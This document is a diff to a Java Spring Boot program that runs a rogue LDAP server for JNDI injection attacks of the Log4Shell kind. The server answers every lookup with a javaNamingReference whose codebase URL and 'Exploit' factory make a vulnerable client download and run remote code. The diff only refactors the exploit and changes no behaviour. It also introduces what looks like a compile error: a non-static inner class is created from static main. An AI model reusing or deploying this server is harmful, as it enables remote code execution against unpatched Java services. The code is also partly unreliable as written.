@@ -11,6 +11,7 @@ import com.unboundid.ldap.sdk.LDAPResult;
 import com.unboundid.ldap.sdk.ResultCode;
 import org.apache.logging.log4j.LogManager;
 import org.apache.logging.log4j.Logger;
+import org.springframework.beans.factory.annotation.Value;
 import org.springframework.boot.SpringApplication;
 import org.springframework.boot.autoconfigure.SpringBootApplication;
 
@@ -25,13 +26,10 @@ public class Application {
     private static final Logger logger = LogManager.getLogger(Application.class);
 
     private static final String LDAP_BASE = "dc=vanderzee,dc=org";
-    private static final int PORT = 12345;
+    private static final int LDAP_PORT = 12345;
 
-    private static final String OBJECT_CLASS = "javaNamingReference";
-    private static final String JAVA_CODE_BASE_URL = "http://localhost:8080/code";
-    private static final String JAVA_CODE_BASE_FILE = "file:///tmp";
-    private static final String JAVA_FACTORY = "Exploit";
-    private static final String JAVA_CLASS_NAME = "foo";
+    @Value("${server.port}")
+    private String port;
 
     public static void main(String[] args) {
         // open up the remote class loading for newer versions of java
@@ -48,21 +46,21 @@ public class Application {
             config.setListenerConfigs(new InMemoryListenerConfig(
                     "listen",
                     InetAddress.getByName("0.0.0.0"),
-                    PORT,
+                    LDAP_PORT,
                     ServerSocketFactory.getDefault(),
                     SocketFactory.getDefault(),
                     (SSLSocketFactory) SSLSocketFactory.getDefault()));
 
             config.addInMemoryOperationInterceptor(new OperationInterceptor());
             InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config);
-            logger.info("LDAP listening on 0.0.0.0:" + PORT);
+            logger.info("LDAP listening on 0.0.0.0:" + LDAP_PORT);
             ds.startListening();
         } catch (Exception e) {
             e.printStackTrace();
         }
     }
 
-    private static class OperationInterceptor extends InMemoryOperationInterceptor {
+    private class OperationInterceptor extends InMemoryOperationInterceptor {
         @Override
         public void processSearchResult(InMemoryInterceptedSearchResult result) {
             String base = result.getRequest().getBaseDN();
@@ -75,14 +73,20 @@ public class Application {
         }
 
         protected void sendResult(InMemoryInterceptedSearchResult result, String base, Entry entry) throws LDAPException {
-            logger.info("sendResult: Send LDAP reference result for '{}' redirecting to '{}' with factory '{}' and class '{}'",
-                    base, JAVA_CODE_BASE_URL, JAVA_FACTORY, JAVA_CLASS_NAME);
+            String objectClass = "javaNamingReference";
+            String javaCodeBaseUrl = "http://localhost:" + port + "/code";
+            String javaCodeBaseFile = "file:///tmp";
+            String javaFactory = "Exploit";
+            String javaClassName = "foo";
 
-            entry.addAttribute("javaClassName", JAVA_CLASS_NAME);
-            entry.addAttribute("javaCodeBase", JAVA_CODE_BASE_URL + "/" + base + "/#" + JAVA_CLASS_NAME);
-//            entry.addAttribute("javaCodeBase", JAVA_CODE_BASE_FILE + "/#" + JAVA_CLASS_NAME);
-            entry.addAttribute("objectClass", OBJECT_CLASS);
-            entry.addAttribute("javaFactory", JAVA_FACTORY);
+            logger.info("sendResult: Send LDAP reference result for '{}' redirecting to '{}' with factory '{}' and class '{}'",
+                    base, javaCodeBaseUrl, javaFactory, javaClassName);
+
+            entry.addAttribute("javaClassName", javaClassName);
+            entry.addAttribute("javaCodeBase", javaCodeBaseUrl + "/" + base + "/#" + javaClassName);
+//            entry.addAttribute("javaCodeBase", javaCodeBaseFile + "/#" + javaClassName);
+            entry.addAttribute("objectClass", objectClass);
+            entry.addAttribute("javaFactory", javaFactory);
 
             result.sendSearchEntry(entry);
             result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
